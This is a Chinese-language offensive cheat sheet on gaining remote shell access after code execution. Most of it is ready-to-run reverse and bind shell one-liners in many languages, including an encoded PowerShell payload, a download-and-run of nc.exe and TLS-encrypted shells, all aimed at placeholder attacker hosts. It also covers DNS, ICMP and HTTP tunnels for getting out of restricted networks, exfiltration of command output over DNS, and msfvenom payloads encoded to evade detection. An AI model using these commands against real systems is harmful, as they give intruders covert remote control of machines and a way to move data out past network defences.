# Reverse Shell & Bind Shell — 反弹/绑定 Shell 与隧道突破

> RCE 确认后，下一个问题就是"网络通不通"。反弹 Shell（reverse）让目标主动连接你，绑定 Shell（bind）让你连接目标。当两者都被防火墙阻断时，隧道技术是最后的通道。

## 关键词

`reverse shell` `反弹shell` `bind shell` `正向shell` `nc` `socat` `bash反弹` `python反弹` `php反弹` `powershell反弹` `加密shell` `openssl加密` `PTY升级` `tty` `不出网` `DNS隧道` `ICMP隧道` `HTTP隧道` `端口转发` `socat中继` `msfvenom` `metasploit`

---

## 1. 反弹 Shell One-liner 全集

### 1.1 Bash

```bash
# 最标准
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# 变体
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# exec 重定向
exec 5<>/dev/tcp/ATTACKER_IP/4444; cat <&5 | while read line; do $line 2>&5 >&5; done

# 无 /dev/tcp (嵌入式/busybox)
bash -c 'exec bash -i &>/dev/tcp/IP/PORT <&1'
```

### 1.2 Python

```python
# Python 3 标准反弹
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Python 3 一行精简
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.0.0.1",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### 1.3 PHP

```php
<?php
// PHP 反弹 shell（一行）
php -r '$sock=fsockopen("IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

// 无 exec 可用时
php -r '$s=fsockopen("IP",4444);proc_open("bash",array(0=>$s,1=>$s,2=>$s),$p);'

// 纯 PHP 实现（适合 webshell 环境）
$sock = fsockopen("IP", 4444);
$proc = proc_open('/bin/bash', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
```

### 1.4 Perl / Ruby / Netcat / Lua

```perl
# Perl
perl -e 'use Socket;$i="IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'

# Ruby
ruby -rsocket -e 'f=TCPSocket.open("IP",4444).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'

# Netcat (传统 nc)
nc -e /bin/bash IP 4444
nc -c /bin/bash IP 4444          # 某些 nc 版本用 -c

# Netcat (无 -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc IP 4444 >/tmp/f

# Netcat (OpenBSD nc)
nc IP 4444 -e /bin/bash

# Lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('IP','4444');os.execute('/bin/bash -i <&3 >&3 2>&3');"
```

### 1.5 PowerShell (Windows)

```powershell
# PowerShell 标准反弹
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbf=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbf,0,$sbf.Length);$s.Flush()};$c.Close()"

# PowerShell EncodedCommand (base64) 绕过
powershell -e JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnAEkAUAAnACwANAA0ADQANAApADsAJABzAD0AJABjAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgA9ADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQA9ACQAcwAuAFIAZQBhAGQAKAAkAGIALAAwACwAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewAkAGQAPQAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACQAaQApADsAJABzAGIAPQAoAGkAZQB4ACAAJABkACAAMgA+ACYAMQB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwApADsAJABzAGIAMgA9ACQAcwBiACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAYgBmAD0AKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAYgAyACkAOwAkAHMALgBXAHIAaQB0AGUAKAAkAHMAYgBmACwAMAAsACQAcwBiAGYALgBMAGUAbgBnAHQAaAApADsAJABzAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAC4AQwBsAG8AcwBlACgAKQA=

# PowerShell + Netcat 简化
powershell -c "iex (iwr http://IP/nc.exe -OutFile C:\Windows\Temp\nc.exe); C:\Windows\Temp\nc.exe IP 4444 -e cmd.exe"
```

### 1.6 Node.js / Go / AWK

```javascript
// Node.js
node -e "(function(){var n=require('net'),s=new n.Socket();s.connect(4444,'IP');process.stdin.pipe(s);s.pipe(process.stdout);})()"

// 或带 exec
node -e "require('child_process').exec('bash -i >& /dev/tcp/IP/4444 0>&1')"
```

```bash
# AWK
awk 'BEGIN{s="/inet/tcp/0/IP/4444";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
```

---

## 2. 绑定 Shell (Bind Shell)

### 2.1 各语言实现

```bash
# Netcat
nc -lvp 4444 -e /bin/bash           # Linux
nc -lvp 4444 -e cmd.exe             # Windows

# Socat
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Bash
bash -c 'while true; do exec 5<>/dev/tcp/0.0.0.0/4444; cat <&5 | while read line; do $line 2>&5 >&5; done; done'

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.bind(("0.0.0.0",4444));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# PowerShell bind
powershell -c "$l=New-Object System.Net.Sockets.TcpListener('0.0.0.0',4444);$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=iex $d 2>&1|Out-String;$sb2=$sb+'PS > ';$sbf=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbf,0,$sbf.Length)};$c.Close()"
```

---

## 3. 加密 Shell (TLS/SSL)

```bash
# ====== OpenSSL 加密反弹 Shell ======
# 攻击机: 生成自签名证书 + 监听
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=localhost'
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444

# 目标机: openssl client
mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_IP:4444 > /tmp/s; rm /tmp/s

# ====== Ncat (nmap 套件) SSL ======
ncat --ssl ATTACKER_IP 4444 -e /bin/bash     # 目标
ncat --ssl -lvp 4444                           # 攻击机

# ====== Socat 加密 ======
# 攻击机
socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0,fork STDOUT

# 目标
socat OPENSSL:ATTACKER_IP:4444,verify=0 EXEC:/bin/bash
```

---

## 4. PTY 升级（TTY Shell）

裸反弹 shell 不是真正 TTY——没有 tab 补全、Ctrl+C 会断开、无法用 sudo/su。必须升级。

```bash
# ====== 方法 1: Python pty (最常用) ======
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'

# 然后 Ctrl+Z 挂起，回到攻击机:
# stty raw -echo; fg
# export TERM=xterm-256color
# stty rows 50 columns 200

# ====== 方法 2: script ======
script /dev/null -c /bin/bash
# Ctrl+Z → stty raw -echo; fg

# ====== 方法 3: Socat PTY (需要先在目标机上传 socat) ======
# 攻击机
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444

# 目标
socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:IP:4444
```

---

## 5. 不出网突破

### 5.1 判定网络拓扑

```bash
# 在目标机测试
ping -c 2 ATTACKER_IP         # ICMP 是否出网
curl http://ATTACKER_IP:80    # HTTP 是否出网
curl https://google.com       # HTTPS 是否出网
nslookup ATTACKER_DOMAIN      # DNS 是否出网
timeout 3 bash -c 'echo >/dev/tcp/IP/4444'  # 自定义 TCP 端口是否通

# 检测防火墙策略
iptables -L -n 2>/dev/null    # iptables 规则
```

### 5.2 DNS 隧道

```bash
# ====== dnscat2 ======
# 攻击机 (需域名 NS 指向本机)
ruby dnscat2.rb --dns="domain=attacker.com" --no-cache

# 目标
./dnscat attacker.com

# ====== iodine ======
# 服务端
iodined -f -c -P password 10.0.0.1 tunnel.attacker.com

# 客户端
iodine -f -P password tunnel.attacker.com

# ====== 手工 DNS 外传 (小数据) ======
# 将命令输出分段编码为域名标签(每段≤63字符)
# hex_encoded.$(id|xxd -p).dnslog.cn
nslookup $(whoami|base64|tr -d '\n='|head -c50).dnslog.cn
```

### 5.3 ICMP 隧道

```bash
# ====== ptunnel (ICMP over TCP) ======
# 需 root/setuid
ptunnel -p PROXY_IP -lp 8000 -da SSH_HOST -dp 22
# → ssh localhost -p 8000

# ====== icmpsh ======
# 攻击机关闭 ICMP 回显
sysctl -w net.ipv4.icmp_echo_ignore_all=1
python icmpsh_m.py ATTACKER_IP TARGET_IP

# 目标 (Windows)
icmpsh.exe -t ATTACKER_IP
```

### 5.4 HTTP 隧道（端口复用）

```bash
# ====== 利用 webshell 实现 HTTP 隧道 ======
# 攻击机 → HTTP POST webshell → eval(shell 命令) → HTTP Response
# 工具: tunna, reGeorg, ABPTTS

# ====== Chisel (Go, 单文件, HTTP/WebSocket 隧道) ======
# 攻击机
./chisel server -p 8080 --reverse --socks5

# 目标
./chisel client ATTACKER_IP:8080 R:socks

# ====== SSH over HTTP Proxy ======
# 用 corkscrew 使 SSH 走 HTTP 代理
# ~/.ssh/config:
# Host target
#   ProxyCommand corkscrew http-proxy 8080 %h %p

# ====== Socat HTTP CONNECT 代理 ======
socat TCP-LISTEN:2222,reuseaddr,fork PROXY:proxy-ip:target-ip:22,proxyport=8080
```

### 5.5 常见出站端口测试

```bash
# 对每个常见端口测试连通性
for port in 80 443 53 8080 8443 21 22 25 587 993; do
  timeout 2 bash -c "echo >/dev/tcp/ATTACKER_IP/$port" 2>/dev/null && echo "Port $port: OPEN"
done
```

---

## 6. MSFVenom Payload 生成速查

```bash
# ====== Linux 反弹 Shell ======
msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell64.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -f python    # Python 格式
msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -f bash      # Bash 一行

# ====== Windows ======
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell64.exe
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f powershell
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f vbs

# ====== PHP / JSP / WAR ======
msfvenom -p php/reverse_php LHOST=IP LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.jsp

# ====== 编码绕过 ======
msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f elf
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe
```

---

## 7. 关联技术

- [[02-webshell]] — Webshell 免杀
- [[03-php-disable-functions-bypass]] — PHP disable_functions 绕过
- [[01-command-injection]] — 命令注入
- [[05-chain-playbook]] — 漏洞→Shell 链
- [[race-cache-smuggling]] — HTTP 走私
